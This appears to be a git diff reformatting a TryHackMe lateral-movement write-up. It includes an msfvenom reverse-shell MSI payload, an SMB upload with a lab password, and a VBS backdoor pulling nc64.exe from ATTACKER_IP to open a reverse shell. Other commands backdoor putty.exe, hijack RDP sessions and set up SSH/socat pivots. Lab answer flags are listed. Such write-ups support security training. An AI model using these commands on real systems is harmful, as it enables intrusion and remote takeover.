@@ -388,7 +388,7 @@ After running the "flag.exe" file on t1_leonard.summers desktop on THMIIS, what 
 ### 1: Generate the MSI Payload
 - On your AttackBox, generate the MSI payload:
 
-      msfvenom -p windows/x64/shell_reverse_tcp LHOST=[YOUR_ATTACKBOX_IP] LPORT=4445 -f msi > myinstaller.msi
+         msfvenom -p windows/x64/shell_reverse_tcp LHOST=[YOUR_ATTACKBOX_IP] LPORT=4445 -f msi > myinstaller.msi
   
 Replace [YOUR_ATTACKBOX_IP] with your AttackBox's IP (use ip a to find it).
 
@@ -398,7 +398,7 @@ Replace [YOUR_ATTACKBOX_IP] with your AttackBox's IP (use ip a to find it).
 ### 2: Upload the Payload
 - Upload the MSI to THMIIS using SMB:
 
-      smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
+         smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
 
 ![image](https://github.com/user-attachments/assets/701a0f06-eb41-42c0-9d63-32e89c7af16f)
   
@@ -406,7 +406,7 @@ Replace [YOUR_ATTACKBOX_IP] with your AttackBox's IP (use ip a to find it).
 ### 3: Set Up Listener
 - Start a Metasploit listener:
 
-      msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST [YOUR_ATTACKBOX_IP]; set LPORT 4445;exploit"
+         msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST [YOUR_ATTACKBOX_IP]; set LPORT 4445;exploit"
 
 ![image](https://github.com/user-attachments/assets/83bc5113-978b-40a1-ba27-04d7a943acc3)
 
@@ -586,7 +586,7 @@ This will display NTLM hashes for logged-in users. Look for `t1_toby.beck`'s has
 
 
 ### 4: Connect to THMIIS
-- In the new command prompt window that opens (which now has t1_toby.beck's token), connect to THMIIS:
+- In the new command prompt window that opens (which now has `t1_toby.beck`'s token), connect to `THMIIS`:
 
       winrs.exe -r:THMIIS.za.tryhackme.com cmd
 
@@ -615,60 +615,64 @@ What is the flag obtained from executing "flag.exe" on t1_toby.beck's desktop on
 <br>
 
 ## Task 6 : Abusing User Behaviour
+   
+   Attackers can exploit common user actions to gain unauthorized access. Below are key techniques:
 
+### 1. Abusing Writable Shares
 
-Attackers can exploit common user actions to gain unauthorized access. Below are key techniques:
+> Scenario
 
-1. Abusing Writable Shares
-Scenario
-Users access shared scripts/executables (e.g., .vbs, .exe) from a network share.
+   - Users access shared scripts/executables (e.g., `.vbs`, `.exe`) from a network share.
+   - If the share is writable, attackers can backdoor these files.
 
-If the share is writable, attackers can backdoor these files.
+> Methods
+   - Backdooring `.vbs` Scripts
+   
+       - Inject malicious code to download & execute a payload:
 
-Methods
-Backdooring .vbs Scripts
-Inject malicious code to download & execute a payload:
+               CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\ATTACKER_IP\share\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe ATTACKER_IP 1234", 0, True
 
-vbs
-CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\ATTACKER_IP\share\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe ATTACKER_IP 1234", 0, True
-When the user runs the script, it silently spawns a reverse shell.
+        - When the user runs the script, it silently spawns a reverse shell.
 
-Backdooring .exe Files
-Use msfvenom to inject a payload into a legitimate executable (e.g., putty.exe):
+   - Backdooring `.exe` Files
+     
+      - Use msfvenom to inject a payload into a legitimate executable (e.g., putty.exe):
+     
+                 msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b "\x00" -f exe -o puttyX.exe
 
-bash
-msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -b "\x00" -f exe -o puttyX.exe
-Replace the original file on the share.
+       - Replace the original file on the share.
+       - When users run it, they execute the backdoor unknowingly.
 
-When users run it, they execute the backdoor unknowingly.
+### 2. RDP Hijacking (Session Stealing)
 
-2. RDP Hijacking (Session Stealing)
-Scenario
-Admins sometimes disconnect (without logging off) from RDP sessions.
+> Scenario
 
-These sessions remain active and can be hijacked.
+- Admins sometimes disconnect (without logging off) from RDP sessions.
+- These sessions remain active and can be hijacked.
 
-Exploitation Steps
-Gain SYSTEM privileges (e.g., via PsExec):
+> Exploitation..
 
-cmd
-PsExec64.exe -s cmd.exe
-List active sessions:
+- Gain SYSTEM privileges (e.g., via PsExec):
 
-cmd
-query user
-Look for Disc (disconnected) sessions.
+      PsExec64.exe -s cmd.exe
+  
+- List active sessions:
 
-Take over a session:
+      query user
+  
+   - Look for `Disc` (disconnected) sessions.
 
-cmd
-tscon SESSION_ID /dest:CURRENT_SESSION_NAME
-Example: tscon 3 /dest:rdp-tcp#6 hijacks session 3 and attaches it to your session.
+- Take over a session:
 
-Limitations
-Works on Windows Server 2016 and earlier.
+        tscon SESSION_ID /dest:CURRENT_SESSION_NAME
+  
+   -  Example: `tscon 3 /dest:rdp-tcp#6` hijacks session 3 and attaches it to your session.
 
-Windows Server 2019+ requires the user's password for session takeover.
+> Limitations
+
+- Works on `Windows Server 2016` and earlier.
+- `Windows Server 2019+` requires the user's password for session takeover.
+
 
 
 
@@ -724,7 +728,7 @@ So, we can identify for active user is 82..
 This will prompt a new windows. where we can find the flag..
 
 ### 6: Access the Flag
-This will open paint.exe where we can find the flag..
+This will open `paint.exe` where we can find the flag..
 
 ![image](https://github.com/user-attachments/assets/c84452be-8657-418b-9c29-cf74afa82e95)
 
@@ -732,7 +736,7 @@ This will open paint.exe where we can find the flag..
 
 ## **_Answers_**
 
-What flag did you get from hijacking t1_toby.beck's session on THMJMP2?
+What flag did you get from hijacking `t1_toby.beck`'s session on THMJMP2?
 
          THM{NICE_WALLPAPER}
 
@@ -743,74 +747,77 @@ What flag did you get from hijacking t1_toby.beck's session on THMJMP2?
 
 ## Task 7 : Port Forwarding
 
-When direct access to target ports is blocked, attackers use port forwarding to pivot through compromised hosts. Below are key techniques:
+   When direct access to target ports is blocked, attackers use port forwarding to pivot through compromised hosts. Below are key techniques:
 
-1. SSH Tunneling
-Remote Port Forwarding
-Use Case: Access a restricted port (e.g., RDP 3389) on an internal server via a compromised host.
+### 1. SSH Tunneling
 
-Command:
+- Remote Port Forwarding
+   - **Use Case:** Access a restricted port (e.g., `RDP 3389`) on an internal server via a compromised host.
+     
+   - **Command:**
+     
+         ssh tunneluser@ATTACKER_IP -R 3389:TARGET_IP:3389 -N
+     
+       - Opens port 3389 on the attacker’s machine, forwarding traffic to the target.
 
-bash
-ssh tunneluser@ATTACKER_IP -R 3389:TARGET_IP:3389 -N
-Opens port 3389 on the attacker’s machine, forwarding traffic to the target.
+    - **Example:**
 
-Example:
+           xfreerdp /v:127.0.0.1 /u:Admin /p:Pass123  # Connect via localhost
+      
+- Local Port Forwarding
+   - **Use Case:** Expose an attacker’s service (e.g., `HTTP 80`) to an internal network.
+   
+   - **Command:**
 
-bash
-xfreerdp /v:127.0.0.1 /u:Admin /p:Pass123  # Connect via localhost
-Local Port Forwarding
-Use Case: Expose an attacker’s service (e.g., HTTP 80) to an internal network.
+            ssh tunneluser@ATTACKER_IP -L *:80:127.0.0.1:80 -N
+        - Hosts in the internal network can now access http://PIVOT_IP:80.
 
-Command:
+   - **Firewall Rule (if needed):**
 
-bash
-ssh tunneluser@ATTACKER_IP -L *:80:127.0.0.1:80 -N
-Hosts in the internal network can now access http://PIVOT_IP:80.
+         netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
 
-Firewall Rule (if needed):
+     
+### 2. Port Forwarding with socat
 
-cmd
-netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
-2. Port Forwarding with socat
-Use Case: Forward ports when SSH is unavailable.
+   - **Use Case:** Forward ports when `SSH` is unavailable.
+   
+   - Basic Syntax:
+     
+            socat TCP4-LISTEN:LOCAL_PORT,fork TCP4:TARGET_IP:TARGET_PORT
+     
+   - Examples:
+      - Forward RDP (`3389`):
+      
+               socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
+     
+      - Expose Attacker’s HTTP (`80`):
+      
+               socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
+     
+   - **Firewall Rule:**
+   
+            netsh advfirewall firewall add rule name="Open Port X" dir=in action=allow protocol=TCP localport=X
 
-Basic Syntax:
 
-bash
-socat TCP4-LISTEN:LOCAL_PORT,fork TCP4:TARGET_IP:TARGET_PORT
-Examples:
+### 3. Dynamic Port Forwarding (SOCKS Proxy)
 
-Forward RDP (3389):
+- **Use Case:** Pivot through a host to scan multiple ports/IPs.
 
-cmd
-socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
-Expose Attacker’s HTTP (80):
+- `SSH` SOCKS Proxy Setup:
 
-cmd
-socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
-Firewall Rule:
+         ssh tunneluser@ATTACKER_IP -R 9050 -N
 
-cmd
-netsh advfirewall firewall add rule name="Open Port X" dir=in action=allow protocol=TCP localport=X
-3. Dynamic Port Forwarding (SOCKS Proxy)
-Use Case: Pivot through a host to scan multiple ports/IPs.
+     - Creates a SOCKS proxy on port 9050.
 
-SSH SOCKS Proxy Setup:
+ - Using proxychains:
 
-bash
-ssh tunneluser@ATTACKER_IP -R 9050 -N
-Creates a SOCKS proxy on port 9050.
+         proxychains curl http://internal.target
+         proxychains nmap -sT -Pn TARGET_IP  # Works with TCP scans
+   
+     - Configure `/etc/proxychains.conf`:
 
-Using proxychains:
-
-bash
-proxychains curl http://internal.target
-proxychains nmap -sT -Pn TARGET_IP  # Works with TCP scans
-Configure /etc/proxychains.conf:
-
-ini
-socks4 127.0.0.1 9050
+               ini
+               socks4 127.0.0.1 9050
 
 
 
@@ -900,7 +907,7 @@ This will display the second flag.
 
 ## **_Answers_**
 
- What is the flag obtained from executing "flag.exe" on t1_thomas.moore's desktop on THMIIS?
+ What is the flag obtained from executing "flag.exe" on `t1_thomas.moore`'s desktop on THMIIS?
 
          THM{SIGHT_BEYOND_SIGHT}
 
